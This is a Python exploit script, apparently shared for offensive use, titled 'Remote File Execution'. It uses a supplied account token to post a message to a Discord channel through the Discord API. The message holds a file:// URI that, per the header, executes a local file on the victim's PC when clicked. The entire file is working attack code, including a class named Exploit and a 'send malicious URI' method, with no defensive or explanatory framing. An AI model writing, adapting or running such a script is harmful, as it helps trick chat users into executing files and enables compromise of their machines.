# Name: Remote File Execution
# Description: Send a URI, that if clicked, executes a file locally on the users PC
# Author: checksum (@0daySkid)
# Original founder: Shay Helman

import requests
import sys
import urllib.parse

class Exploit:

    def __init__(self, token, channel, file_path):
        self.token = token
        self.channel_id = channel
        self.file_path = file_path
        self.headers = {'Authorization': token}

    @property
    def _file_path(self):
        """ URL encode file path """
        return urllib.parse.quote(self.file_path)

    def execute(self):
        """ send malicious URI """
        return requests.post(f'https://discordapp.com/api/v6/channels/{self.channel_id}/messages', headers=self.headers, json={'content': f'<file://{self._file_path}>'})


def main():
    if len(sys.argv) < 4:
        print(f'Usage: py {sys.argv[0]} <token> <channel id> <path to executable>')
        sys.exit()

    token = sys.argv[1]
    channel_id = sys.argv[2]
    file_path = sys.argv[3]

    exploit = Exploit(token, channel_id, file_path)

    exploit.execute()


if __name__ == '__main__':
    main()
